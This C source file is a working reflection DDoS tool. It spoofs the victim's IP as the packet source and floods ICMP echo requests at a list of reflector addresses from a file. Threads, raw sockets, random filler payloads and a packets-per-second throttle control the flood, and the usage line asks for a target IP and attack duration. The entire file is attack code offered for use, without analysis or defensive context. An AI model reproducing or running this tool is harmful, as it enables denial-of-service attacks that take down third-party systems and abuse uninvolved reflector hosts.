// fatti was here

#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <linux/icmp.h>
#include <arpa/inet.h>
#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9
static unsigned long int Q[4096], c = 362436;
static unsigned int floodport;
struct list
{
    struct sockaddr_in data;
    struct list *next;
    struct list *prev;
};
struct list *head;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
struct thread_data
{
    int thread_id;
    int dport;
    struct list *list_node;
    struct sockaddr_in sin;
};
void init_rand(unsigned long int x)
{
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++)
    {
        Q[i] = Q[i] ^ Q[i] ^ PHI ^ i;
    }
}
unsigned long int rand_cmwc(void)
{
    unsigned long long int t, a = 18782LL;
    static unsigned long int i = 4095;
    unsigned long int x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c)
    {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}
int randnum(int min_num, int max_num)
{
    int result = 0, low_num = 0, hi_num = 0;

    if (min_num < max_num)
    {
        low_num = min_num;
        hi_num = max_num + 1;
    }
    else
    {
        low_num = max_num + 1;
        hi_num = min_num;
    }

    result = (rand_cmwc() % (hi_num - low_num)) + low_num;
    return result;
}
unsigned short csum(unsigned short *buf, int count)
{
    register unsigned long sum = 0;
    while (count > 1)
    {
        sum += *buf++;
        count -= 2;
    }
    if (count > 0)
    {
        sum += *(unsigned char *)buf;
    }
    while (sum >> 16)
    {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    return (unsigned short)(~sum);
}
char *strings[] = {
    "\x5c\x78\x38\x66\x5c\x72\x5c\x6e",
    "\x68\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64\x21",
    "\x47\x45\x54\x20\x2f\x20\x48\x54\x54\x50\x2f\x31\x2e\x31",
    "\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x3a\x20\x63\x6c\x6f\x73\x65",
    "\x55\x44\x50\x2d\x43\x48\x45\x43\x4b\x2d\x49\x50\x50\x52\x4f\x54\x4f\x5f\x55\x44\x50",
    "\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x57\x67\x65\x74\x2f\x31\x2e\x31\x34\x2e\x31"
};
char *rand_strs[] = {"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", 
"r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", 
"M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "1", "2", "3", "4", "5", "6", "7", 
"8", "9", "0", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "?", "?", "?", "?", "?", "??", "?"};
unsigned int cwr = 1;
static const char PAYLOAD[] = "\x47\x45\x54\x20\x2F\x20\x48\x54\x54\x50\x2F\x31\x2E\x31\x5C\x72\x5C\x6E\x48\x6F\x73\x74\x3A\x20\x77\x77\x77\x2E\x79\x6F\x75\x70\x6F\x72\x6E\x2E\x63\x6F\x6D";
static const char PAYLOAD2[] = "\x47\x45\x54\x20\x2F\x20\x48\x54\x54\x50\x2F\x31\x2E\x31\x5C\x72\x5C\x6E\x48\x6F\x73\x74\x3A\x20\x77\x77\x77\x2E\x72\x6F\x78\x79\x70\x6C\x61\x63\x65\x2E\x63\x6F\x6D\x5C\x72\x5C\x6E\x5C\x72\x5C\x6E";
static unsigned int PAYLOADSIZE = sizeof(PAYLOAD) - 1;
static unsigned int PAYLOADSIZE2 = sizeof(PAYLOAD2) - 1;

unsigned short in_cksum(unsigned short* addr, int len)
{
   register int sum = 0;
   u_short answer = 0;
   register u_short* w = addr;
   register int nleft;
   /*
   * Our algorithm is simple, using a 32 bit accumulator (sum), we add
   * sequential 16 bit words to it, and at the end, fold back all the
   * carry bits from the top 16 bits into the lower 16 bits.
   */
   for(nleft = len; nleft > 1; nleft -= 2)
   {
      sum += *w++;
   }
   /* mop up an odd byte, if necessary */
   if(nleft == 1)
   {
      *(u_char*) (&answer) = *(u_char*) w;
      sum += answer;
   }
   /* add back carry outs from top 16 bits to low 16 bits */
   sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */
   sum += (sum >> 16); /* add carry */
   answer = ~sum; /* truncate to 16 bits */
   return answer;
}
int proto[2] = {6, 17};
void setup_ip_header(struct iphdr *iph)
{
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = IPTOS_ECN_NOT_ECT;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct icmphdr);
    iph->id = htonl(54321);
    iph->frag_off = htons(0x4000);
    iph->ttl = 255;
    iph->protocol = 1;
    iph->check = 0;
   // iph->saddr = inet_addr("192.168.3.100");
}


int ports[3] = {80, 443, 22};
void setup_icmp_header(struct icmphdr *icmph)
{  
    icmph->un.echo.sequence = rand();
    icmph->un.echo.id = rand();
    icmph->type = ICMP_ECHO;
    icmph->code = 0;
    icmph->checksum = 0;
    icmph->checksum = in_cksum((unsigned short *)icmph, sizeof(struct icmphdr));
}
char *rand_str(int size) {
    int i = 0;
    char *string = malloc((size * 2) + 1);

    while(i < size) {
        if(i == 0) {
            sprintf(string, "%s", rand_strs[rand() % sizeof(rand_strs)/sizeof(rand_strs[0])]);
        } else {
            sprintf(string, "%s%s", string, rand_strs[rand() % sizeof(rand_strs)/sizeof(rand_strs[0])]);
        }
        i++;
    }
    return string;
}

char *str_gen() {
    char *string = malloc(512);
    char *random = rand_str(rand() % 30);
    sprintf(string, "%s", strings[rand() % sizeof(strings)/sizeof(strings[0])]);
    sprintf(string, "%s%s", string, random);
    free(random);
    return string;
}


void *flood(void *par1)
{
    struct thread_data *td = (struct thread_data *)par1;

    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram; 
    struct icmphdr *icmph = (void *)iph + sizeof(struct iphdr);
   // struct tcpopts *opts = (void *)iph + sizeof(struct iphdr) + sizeof(struct tcphdr); // including our specified tcp options in the datagram.
    struct sockaddr_in sin = td->sin;
    struct list *list_node = td->list_node;
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s < 0)
    {
        fprintf(stderr, "Could not open raw socket.\n");
        exit(-1);
    }
    memset(datagram, 0, MAX_PACKET_SIZE);
    setup_ip_header(iph);
    setup_icmp_header(icmph);
    sin.sin_port = htons(floodport);
    iph->saddr = sin.sin_addr.s_addr;
    iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
    int tmp = 1;
    const int *val = &tmp;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0)
    {
        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
        exit(-1);
    }
    init_rand(time(NULL));
    register unsigned int i;
    i = 0;
    while (1)
    {
        //tcph->dest = htons(ports[randnum(0, 3)]);
        iph->ttl = 255;
        // iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
        list_node = list_node->next;
        iph->daddr = list_node->data.sin_addr.s_addr;
        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
        iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
        //tcph->source = htons(ports[randnum(0, 3)]);
        // tcph->source = htons(td->dport); 
        //icmph->dest = htons(floodport); 
        //icmph->checksum = icmpChecksum(iph, icmph);
        char *string = str_gen();
        memcpy((void *)icmph + sizeof(struct icmphdr), string, strlen(string));
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
       
        pps++;
        if (i >= limiter)
        {
            i = 0;
            usleep(sleeptime);
        }
        i++;
    }
}
int main(int argc, char *argv[])
{
    if (argc < 6)
    {
        fprintf(stderr, "Invalid parameters!\n");
        fprintf(stdout, "Usage: %s <target IP> <port> <reflection file> <threads> <pps limiter, -1 for no limit> <time>\n", argv[0]);
        exit(-1);
    }
    srand(time(NULL));
    int i = 0;
    head = NULL;
    fprintf(stdout, "Setting up sockets...\n");
    int floodport = atoi(argv[2]);
    int max_len = 512;
    char *buffer = (char *)malloc(max_len);
    buffer = memset(buffer, 0x00, max_len);
    int num_threads = atoi(argv[4]);
    int maxpps = atoi(argv[5]);
    limiter = 0;
    pps = 0;
    int multiplier = 100;
    FILE *list_fd = fopen(argv[3], "r");
    while (fgets(buffer, max_len, list_fd) != NULL)
    {
        if ((buffer[strlen(buffer) - 1] == '\n') ||
            (buffer[strlen(buffer) - 1] == '\r'))
        {
            buffer[strlen(buffer) - 1] = 0x00;
            if (head == NULL)
            {
                head = (struct list *)malloc(sizeof(struct list));
                bzero(&head->data, sizeof(head->data));
                head->data.sin_addr.s_addr = inet_addr(buffer);
                head->next = head;
                head->prev = head;
            }
            else
            {
                struct list *new_node = (struct list *)malloc(sizeof(struct list));
                memset(new_node, 0x00, sizeof(struct list));
                new_node->data.sin_addr.s_addr = inet_addr(buffer);
                new_node->prev = head;
                new_node->next = head->next;
                head->next = new_node;
            }
            i++;
        }
        else
        {
            continue;
        }
    }
    struct list *current = head->next;
    pthread_t thread[num_threads];
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr(argv[1]);
    struct thread_data td[num_threads];
    for (i = 0; i < num_threads; i++)
    {
        td[i].thread_id = i;
        td[i].sin = sin;
        td[i].dport = floodport;
        td[i].list_node = current;
        pthread_create(&thread[i], NULL, &flood, (void *)&td[i]);
    }
    fprintf(stdout, "Starting flood...\n");
    for (i = 0; i < (atoi(argv[6]) * multiplier); i++)
    {
        usleep((1024 / multiplier) * 1024);
        if ((pps * multiplier) > maxpps)
        {
            if (1 > limiter)
            {
                sleeptime += 100;
            }
            else
            {
                limiter--;
            }
        }
        else
        {
            limiter++;
            if (sleeptime > 25)
            {
                sleeptime -= 25;
            }
            else
            {
                sleeptime = 0;
            }
        }
        pps = 0;
    }
    return 0;
}
